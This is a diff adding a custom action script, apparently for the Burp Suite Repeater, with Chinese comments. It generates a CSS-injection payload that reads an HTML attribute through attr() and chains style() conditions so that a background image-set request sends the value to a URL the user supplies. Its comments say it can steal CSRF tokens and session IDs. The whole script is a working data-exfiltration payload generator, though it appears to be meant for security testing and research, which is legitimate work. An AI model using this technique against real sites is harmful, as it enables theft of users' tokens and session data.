@@ -1,0 +1,87 @@
+id: 9281da1d-0bf1-4577-b525-9099f94ec4d0
+name: 内联样式属性窃取器
+function: CUSTOM_ACTION
+location: REPEATER
+source: |+
+  /**
+  * 内联样式属性窃取器脚本
+  * 
+  * 功能描述：
+  * 该脚本创建示例HTML代码和内联样式，仅使用内联样式来窃取属性值。
+  * 它支持通过Java输入对话框获取的4个参数：
+  * 1. 属性 - 要窃取的属性名称
+  * 2. URL前缀 - 要将数据泄露到的URL
+  * 3. 值 - 要泄露的最大数量或逗号分隔的值列表
+  * 4. 默认值 - 应该放置在属性值中的默认值
+  * 
+  * 实现逻辑：
+  * 1. 通过对话框获取用户输入的4个参数
+  * 2. 根据值参数类型（列表或数字）构造不同的CSS链式条件
+  * 3. 如果是逗号分隔的列表，为每个值创建条件判断
+  * 4. 如果是数字，创建从1到最大值的数字范围条件
+  * 5. 使用CSS的attr()函数和条件样式构造窃取逻辑
+  * 6. 生成包含恶意样式的HTML代码
+  * 7. 输出最终的HTML代码到日志
+  * 
+  * 使用场景：
+  * - CSS注入攻击中的属性值窃取
+  * - 测试CSS样式注入漏洞
+  * - 演示基于CSS的数据泄露技术
+  * - 安全研究和漏洞利用开发
+  * 
+  * 安全影响：
+  * 可用于窃取敏感属性值，如CSRF令牌、会话ID等
+  *
+  * @author Gareth Heyes
+  **/
+  
+  // 获取要窃取的属性名称
+  var attribute = javax.swing.JOptionPane.showInputDialog(null, "请输入要窃取的属性名称", "属性", javax.swing.JOptionPane.QUESTION_MESSAGE);
+  if(attribute == null) return;
+  
+  // 获取数据泄露的目标URL前缀
+  var urlPrefix = javax.swing.JOptionPane.showInputDialog(null, "请输入要发送数据的URL", "URL", javax.swing.JOptionPane.QUESTION_MESSAGE);
+  if(urlPrefix == null) return;
+  
+  // 获取要泄露的值（逗号分隔列表或最大数值）
+  var value = javax.swing.JOptionPane.showInputDialog(null, "请输入逗号分隔的数据列表或最大数值", "值", javax.swing.JOptionPane.QUESTION_MESSAGE);
+  if(value == null) return;
+  
+  // 获取默认属性值
+  var defaultValue = javax.swing.JOptionPane.showInputDialog(null, "请输入要窃取的默认值", "默认值", javax.swing.JOptionPane.QUESTION_MESSAGE);
+  if(defaultValue == null) return;
+  
+  var chain = "";
+
+  // 如果值包含逗号，说明是列表形式
+  if(value.contains(",")) {
+    var values = value.split(",");
+    // 构造最后一个值的URL
+    chain = "url(" + urlPrefix + "/" + values[values.length-1] + ")";
+    if(values.length < 2) return;
+
+    // 从倒数第二个值开始，构造条件链
+    for (var i = values.length - 2; i > 0; i--) {
+        chain = String.format("if(style(--val:\"%s\"): \"%s/%s\"; else: %s)", values[i], urlPrefix, values[i], chain);
+    }
+
+  } else {
+    // 如果是数字，构造数字范围的条件链
+    var maxVal = Integer.parseInt(value);
+    chain = "url(" + urlPrefix + "/" + maxVal + ")";
+    for (var i = maxVal - 1; i > 0; i--) {
+        chain = String.format("if(style(--val:\"%d\"): \"%s/%d\"; else: %s)", i, urlPrefix, i, chain);
+    }
+  }
+
+  // 构造CSS样式字符串
+  // --val: 获取属性值
+  // --steal: 窃取逻辑链
+  // background: 触发网络请求的样式
+  var styleStr = String.format("--val: attr(%s); --steal: %s; background: image-set(var(--steal));", attribute, chain);
+  
+  // 生成包含恶意样式的HTML元素
+  var html = "<div style='" + styleStr + "' "+attribute+"=\""+defaultValue+"\"></div>";
+  
+  // 输出生成的HTML代码
+  logging().logToOutput(html);
